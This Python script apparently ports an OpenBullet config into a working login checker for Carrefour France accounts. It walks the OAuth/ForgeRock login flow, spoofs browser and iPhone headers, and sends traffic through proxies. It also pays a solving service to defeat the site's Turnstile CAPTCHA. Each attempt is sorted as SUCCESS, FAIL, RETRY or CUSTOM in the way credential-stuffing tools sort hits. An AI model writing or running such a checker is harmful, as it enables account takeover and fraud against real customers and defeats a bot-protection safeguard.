#!/usr/bin/env python3
"""
Python equivalent of the provided OpenBullet-style block flow:
PKCE generation → OAuth authorize redirects → ForgeRock authenticate → Turnstile (Solverify) → login POST.

Configure via environment variables (do not commit secrets):
  PROXY_URL          e.g. http://user:pass@host:port
  SOLVERIFY_KEY      clientKey for solver.solverify.net
  CARREFOUR_USER     login email
  CARREFOUR_PASS     password

Optional:
  LOCAL_FORWARD_URL  If set (e.g. http://127.0.0.1:5000), HTTP calls go there with postUrl/postProxy headers like the original blocks.
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import secrets
import string
import time
import urllib.parse
from typing import Any

import requests

# --- PKCE (same alphabet as RFC 7636 / original Node script) ---
_VERIFIER_CHARS = string.ascii_letters + string.digits + "-._~"


def generate_code_verifier(length: int = 128) -> str:
    return "".join(secrets.choice(_VERIFIER_CHARS) for _ in range(length))


def base64url_encode_raw(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def generate_code_challenge(code_verifier: str) -> str:
    digest = hashlib.sha256(code_verifier.encode("utf-8")).digest()
    return base64url_encode_raw(digest)


def _proxy_dict(proxy_url: str | None) -> dict[str, str] | None:
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


class ForwardingSession:
    """Either talks to local forwarder (postUrl/postProxy) or uses requests directly with PROXY_URL."""

    def __init__(
        self,
        *,
        proxy_url: str | None,
        forward_base: str | None,
        timeout: float = 60.0,
    ) -> None:
        self._proxy_url = proxy_url
        self._forward_base = forward_base.rstrip("/") if forward_base else None
        self._timeout = timeout
        self._session = requests.Session()

    def request(
        self,
        method: str,
        url: str,
        *,
        headers: dict[str, str] | None = None,
        data: str | bytes | None = None,
        json_body: Any = None,
        allow_redirects: bool = False,
    ) -> requests.Response:
        hdrs = dict(headers or {})
        proxies = _proxy_dict(self._proxy_url)

        if self._forward_base:
            hdrs["postUrl"] = url
            if self._proxy_url:
                hdrs["postProxy"] = self._proxy_url
            req_url = self._forward_base + "/"
            return self._session.request(
                method,
                req_url,
                headers=hdrs,
                data=data,
                json=json_body,
                allow_redirects=allow_redirects,
                timeout=self._timeout,
            )

        return self._session.request(
            method,
            url,
            headers=hdrs,
            data=data,
            json=json_body,
            allow_redirects=allow_redirects,
            proxies=proxies,
            timeout=self._timeout,
        )


def _location(resp: requests.Response) -> str | None:
    loc = resp.headers.get("Location") or resp.headers.get("location")
    return loc


def _absolute(base: str, loc: str) -> str:
    return urllib.parse.urljoin(base, loc)


def parse_lr(text: str, left: str, right: str) -> str | None:
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except ValueError:
        return None


def extract_json_token(source: str, key: str) -> Any:
    data = json.loads(source)
    cur: Any = data
    for part in key.split("."):
        if isinstance(cur, dict) and part in cur:
            cur = cur[part]
        else:
            return None
    return cur


def _extract_turnstile_token(obj: dict[str, Any]) -> str | None:
    """Solver responses vary; original blocks read JSON key `value`."""
    if isinstance(obj.get("value"), str):
        return obj["value"]
    sol = obj.get("solution")
    if isinstance(sol, dict):
        for k in ("token", "cf-turnstile-response", "value"):
            v = sol.get(k)
            if isinstance(v, str) and v:
                return v
    return None


def poll_turnstile_token(
    session: ForwardingSession,
    *,
    solver_key: str,
    task_id: str,
    poll_interval: float = 2.0,
    max_wait: float = 120.0,
) -> str:
    deadline = time.monotonic() + max_wait
    payload = {"clientKey": solver_key, "taskId": task_id}
    while time.monotonic() < deadline:
        r = session.request(
            "POST",
            "https://solver.solverify.net/getTaskResult",
            headers={"Content-Type": "application/json"},
            data=json.dumps(payload),
        )
        body = r.text
        try:
            obj = json.loads(body)
        except json.JSONDecodeError:
            time.sleep(poll_interval)
            continue
        err_id = obj.get("errorId")
        if err_id not in (0, None) and err_id != "0":
            raise RuntimeError(f"getTaskResult error: {obj}")
        status = obj.get("status")
        if status == "processing":
            time.sleep(poll_interval)
            continue
        if status == "completed":
            token = _extract_turnstile_token(obj)
            if token:
                return token
            raise RuntimeError(f"Completed but no token in response: {body[:500]}")
        if status:
            raise RuntimeError(f"Unexpected solver status {status!r}: {body[:500]}")
        time.sleep(poll_interval)
    raise TimeoutError("Turnstile task did not complete in time")


def run_flow(
    *,
    username: str,
    password: str,
    proxy_url: str | None,
    solver_key: str,
    forward_base: str | None = None,
) -> dict[str, Any]:
    code_verifier = generate_code_verifier()
    code_challenge = generate_code_challenge(code_verifier)

    session = ForwardingSession(proxy_url=proxy_url, forward_base=forward_base)

    # 1) Initial authorize (iOS client)
    authorize_qs = urllib.parse.urlencode(
        {
            "response_type": "code",
            "client_id": "carrefour_onecarrefour_ios",
            "scope": "openid iam",
            "redirect_uri": "fr.carrefourconnect://redirect_uri",
            "code_challenge": code_challenge,
            "code_challenge_method": "S256",
        },
        safe="",
    )
    url1 = f"https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?{authorize_qs}"
    h1 = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
        ),
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
    }
    r1 = session.request("GET", url1, headers=h1, allow_redirects=False)
    loc1 = _location(r1)
    if not loc1:
        raise RuntimeError(f"No Location after authorize: status={r1.status_code} body={r1.text[:300]}")

    # 2) Follow Location1 with browser headers
    url2 = _absolute("https://moncompte.carrefour.fr/", loc1)
    h2 = {
        **h1,
        "Connection": "close",
        "Host": "moncompte.carrefour.fr",
        "Referer": "https://www.carrefour.fr/",
        'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
        "sec-ch-ua-mobile": "?0",
        'sec-ch-ua-platform': '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }
    r2 = session.request("GET", url2, headers=h2, allow_redirects=False)
    loc2 = _location(r2)
    if not loc2:
        raise RuntimeError(f"No Location after second GET: status={r2.status_code}")

    # 3) GET moncompte path from loc2
    url3 = _absolute("https://moncompte.carrefour.fr", loc2)
    h3 = {
        "User-Agent": h1["User-Agent"],
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.8",
    }
    session.request("GET", url3, headers=h3, allow_redirects=False)

    # 4) Anonymous authenticate (empty JSON body as in original)
    goto_ios = (
        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        f"client_id=carrefour_onecarrefour_ios&code_challenge={urllib.parse.quote(code_challenge)}"
        "&code_challenge_method=S256&redirect_uri=fr.carrefourconnect://redirect_uri"
        "&response_type=code&scope=openid iam"
    )
    auth_url = (
        "https://moncompte.carrefour.fr/iam/json/authenticate?"
        + urllib.parse.urlencode({"goto": goto_ios, "realm": "/CarrefourConnect"})
    )
    h4 = {
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Content-Length": "0",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    r4 = session.request("POST", auth_url, headers=h4, data="", allow_redirects=False)
    src4 = r4.text
    auth_id = parse_lr(src4, 'authId":"', '"')
    if not auth_id:
        # try JSON path
        try:
            auth_id = extract_json_token(src4, "authId")
        except json.JSONDecodeError:
            auth_id = None
    if not auth_id:
        raise RuntimeError(f"Could not parse authId from: {src4[:800]}")

    # 5) Create Turnstile task
    task_payload = {
        "clientKey": solver_key,
        "task": {
            "type": "turnstile",
            "websiteURL": "https://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize",
            "websiteKey": "0x4AAAAAAADaNvwE6lw9Qsdq",
            "cdata": "",
            "action": "LOGIN",
        },
    }
    r5 = session.request(
        "POST",
        "https://solver.solverify.net/createTask",
        headers={"Content-Type": "application/json"},
        data=json.dumps(task_payload),
    )
    task_body = json.loads(r5.text)
    err_id = task_body.get("errorId")
    if err_id not in (0, None, "0"):
        raise RuntimeError(f"createTask error: {task_body}")
    task_id = task_body.get("taskId")
    if not task_id:
        raise RuntimeError(f"No taskId in: {r5.text[:500]}")

    token44 = poll_turnstile_token(session, solver_key=solver_key, task_id=str(task_id))

    # 6) Login POST (matches original JSON structure; goto uses web client)
    goto_web = (
        "http://moncompte.carrefour.fr/iam/oauth2/CarrefourConnect/authorize?"
        "client_id=carrefour_onecarrefour_web&redirect_uri=https%3A%2F%2Fwww.carrefour.fr%2Flogin%2Fcheck"
        "&response_type=code&scope=openid iam register-aHR0cHM6Ly93d3cuY2FycmVmb3VyLmZyL21vbi1jb21wdGUvaW5zY3JpcHRpb24%3D"
    )
    login_auth_url = (
        "https://moncompte.carrefour.fr/iam/json/authenticate?"
        + urllib.parse.urlencode({"realm": "/CarrefourConnect", "goto": goto_web})
    )
    login_body = {
        "authId": auth_id,
        "template": "",
        "stage": "CarrefourIAMLDAP1",
        "header": "Content de vous (re)voir !",
        "callbacks": [
            {
                "type": "NameCallback",
                "output": [{"name": "prompt", "value": "Adresse électronique"}],
                "input": [{"name": "IDToken1", "value": username}],
            },
            {
                "type": "PasswordCallback",
                "output": [{"name": "prompt", "value": "Mot de passe"}],
                "input": [{"name": "IDToken2", "value": password}],
            },
            {
                "type": "CaptchaCallback",
                "output": [
                    {"name": "version", "value": "V2(Invisible)"},
                    {"name": "prompt", "value": "0x4AAAAAAADaNvwE6lw9Qsdq"},
                ],
                "input": [{"name": "IDToken3", "value": token44}],
            },
        ],
    }
    h6 = {
        "Host": "moncompte.carrefour.fr",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-cache",
        "User-Agent": h4["User-Agent"],
        "Referer": "https://moncompte.carrefour.fr/iam/XUI/",
        "X-NoSession": "true",
        "X-Username": "anonymous",
        "Origin": "https://moncompte.carrefour.fr",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "same-origin",
        "Connection": "keep-alive",
        "X-Password": "anonymous",
        "Accept-Language": "fr-FR",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-API-Version": "protocol=1.0,resource=2.0",
        "Sec-Fetch-Mode": "cors",
    }
    r6 = session.request(
        "POST",
        login_auth_url,
        headers=h6,
        data=json.dumps(login_body, ensure_ascii=False),
        allow_redirects=False,
    )
    text6 = r6.text

    outcome = classify_login_response(text6)
    return {
        "code_verifier": code_verifier,
        "code_challenge": code_challenge,
        "auth_id": auth_id,
        "task_id": task_id,
        "turnstile_token": token44,
        "login_status": r6.status_code,
        "login_body": text6,
        "outcome": outcome,
    }


def classify_login_response(source: str) -> str:
    if "successUrl" in source:
        return "SUCCESS"
    if "Domaine non valide" in source:
        return "RETRY"
    fail_markers = (
        "Votre adresse ou mot de passe ne sont pas valides",
        "Compte suspendu",
        "was expecting comma to separate Object entries",
        "Changement de mot de passe",
        "Unrecognized character escape ",
    )
    if any(m in source for m in fail_markers):
        return "FAIL"
    if "Aidez-nous à confirmer votre identité" in source:
        return "CUSTOM"
    return "UNKNOWN"


def main() -> None:
    proxy_url = os.environ.get("PROXY_URL")
    solver_key = os.environ.get("SOLVERIFY_KEY", "").strip()
    user = os.environ.get("CARREFOUR_USER", "").strip()
    password = os.environ.get("CARREFOUR_PASS", "").strip()
    forward_base = os.environ.get("LOCAL_FORWARD_URL", "").strip() or None

    if not solver_key or not user or not password:
        raise SystemExit(
            "Set SOLVERIFY_KEY, CARREFOUR_USER, and CARREFOUR_PASS. "
            "Optional: PROXY_URL, LOCAL_FORWARD_URL (http://127.0.0.1:5000)."
        )

    result = run_flow(
        username=user,
        password=password,
        proxy_url=proxy_url,
        solver_key=solver_key,
        forward_base=forward_base,
    )
    print(json.dumps({k: v for k, v in result.items() if k != "login_body"}, indent=2))
    print("--- login response (truncated) ---")
    body = result["login_body"]
    print(body[:2000] + ("..." if len(body) > 2000 else ""))


if __name__ == "__main__":
    main()
